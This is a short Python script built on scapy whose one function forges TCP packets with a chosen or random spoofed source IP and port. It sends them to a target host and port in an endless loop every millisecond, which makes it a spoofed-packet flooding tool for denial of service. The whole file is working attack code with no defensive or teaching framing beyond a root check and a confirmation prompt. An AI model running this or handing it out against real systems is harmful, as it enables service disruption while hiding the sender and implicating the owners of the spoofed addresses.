from scapy.all import *
import random
from colorama import Fore, Back, Style



def spoof(source_ip, source_port, target_ip, target_port):

    # If not sudo, don't allow to continue
    if not 'SUDO_UID' in os.environ.keys():
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Permission error: {Fore.RED}You need root privileges for this feature.{Style.RESET_ALL}')
        sys.exit()

    try:
        if source_ip.lower() == 'r':
            src_ip = f'{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}'
        else:
            src_ip = f'{source_ip}'
        if source_port.lower() == 'r':
            src_port = int(random.randint(1, 56666))
        else:
            src_port = int(source_port)
        
        tgt_ip = target_ip
        tgt_port = int(target_port)

        choice = input(f'Source IP: {src_ip}\nSource port: {src_port}\nTarget IP: {tgt_ip}\nTarget port: {tgt_port}\nDo you wish to continue? [Y/N]: ')

        if choice.lower() == 'y':
            i=1

            IP1 = IP(src=src_ip, dst=tgt_ip)
            TCP1 = TCP(sport=src_port, dport=tgt_port)
            pkt = IP1 / TCP1
        else:
            print('Operation was cancelled.')
            sys.exit('\n')
        while True:
            send(pkt,inter= .001)
            print(f"Packet(s) sent [{i}]")
            i=i+1
    except KeyboardInterrupt:
        sys.exit('\n')
    except Exception as e:
        e = sys.exc_info()[1]
        print(f'[{Fore.RED}!{Style.RESET_ALL}] Error: {Fore.RED}{e}{Style.RESET_ALL}')
    
    